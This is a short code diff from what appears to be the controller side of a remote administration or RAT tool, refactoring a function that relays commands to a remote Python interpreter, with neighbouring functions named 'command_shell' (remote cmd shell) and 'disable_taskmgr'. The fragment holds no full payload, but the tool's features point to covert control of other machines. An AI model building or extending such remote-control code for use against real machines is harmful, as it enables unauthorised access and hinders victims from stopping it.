@@ -364,19 +364,19 @@ def command_shell():  # remote cmd shell
             print(strDefault, end="")
 
 def python_interpreter():
-    send(b'python')
+    send(str.encode("python"))
     recv(intBuff)
-    while 1:
-        command = input(">>> ")
-        if command.strip() == '':
+    while True:
+        strCommand = input("\n" + ">>> ")
+        if strCommand.strip() == "":
             continue
-        if command == 'exit' or command == 'exit()':
+        if strCommand == "exit" or strCommand == "exit()":
             break
-        send(command.encode())
-        received = recv(intBuff).decode().rstrip("\n")
-        if received != '':
-            print(received)
-    send(b'exit')
+        send(strCommand.encode())
+        strReceived = recv(intBuff).decode("utf-8").rstrip("\n")
+        if strReceived != "":
+            print(strReceived)
+    send(str.encode("exit"))
     recv(intBuff)
 
 def disable_taskmgr():
